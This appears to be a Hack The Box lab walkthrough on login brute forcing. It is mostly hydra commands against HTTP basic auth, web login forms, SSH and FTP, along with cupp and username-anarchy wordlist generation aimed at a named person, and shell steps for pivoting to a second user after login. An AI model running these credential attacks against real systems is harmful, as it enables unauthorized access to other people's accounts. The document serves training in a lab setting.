# [HTB] Login Brute Forcing

## Default Passwords

>**Q. Using the technique you learned in this section, try attacking the IP shown above. What are the credentials used?**

```bash
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.253.106 -s 55305 http-get /
```

## Username Brute Force

>**Q. Try running the same exercise on the question from the previous section, to learn how to brute force for users.**

```bash
Hint: Use the same answer as the previous question!
```

## Login Form Attacks

>**Q. Using what you learned in this section, try attacking the '/login.php' page to identify the password for the 'admin' user. Once you login, you should find a flag. Submit the flag as the answer.**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 83.136.253.106 -s 55305 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

## Service Authentication Brute Forcing

>**Q. Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?**

```bash
sudo apt install cupp
```
```
Code: bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

>**Q. Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?**

```bash
cupp -i
hydra -l b.gates -P william.txt -u -f ssh://83.136.253.168:43879 -t 4
ssh b.gates@83.136.253.168 -p 43879
ls
cat flag.txt
```

```bash
ls /home
netstat -antp | grep -i list
hydra -l m.gates -P rockyou-10.txt -u -f ftp://0.0.0.0
ftp 0.0.0.0
ls
get flag.txt
exit
ls
cat flag.txt
```

## Skills Assessment - Website

>**Q. When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.**

```bash
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 83.136.254.230 -s 42335 http-get / 
```


>**Q. Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?**

Hint: You may reuse the username you found earlier. Make sure you got the correct fail string and parameters.

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt -f 83.136.254.230 -s 42335 http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
```

## Skills Assessment - Service Login

>**Q. As you now have the name of an employee, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also use 'usernameGenerator' to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.**

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Harry Potter > usernameHarry.txt
cp usernameHarry.txt ../
```

```bash
cupp -i
```

```bash
> First Name: Harry
> Surname: Potter
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:n
> Leet mode? (i.e. leet = 1337) Y/[N]: Y
```

```bash
hydra -L usernameHarry.txt -P harry.txt -u -f ssh://83.136.255.177:36015 -t 4
```

```bash
ssh username@83.136.255.177 -p 36015
ls
cat flag.txt
```

>**Q. Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.**

```bash
ls /home
netstat -antp | grep -i list
hydra -l g.potter -P rockyou-30.txt -u -f ftp://0.0.0.0
ftp 0.0.0.0
ls
get flag.txt
exit
ls
cat flag.txt
```
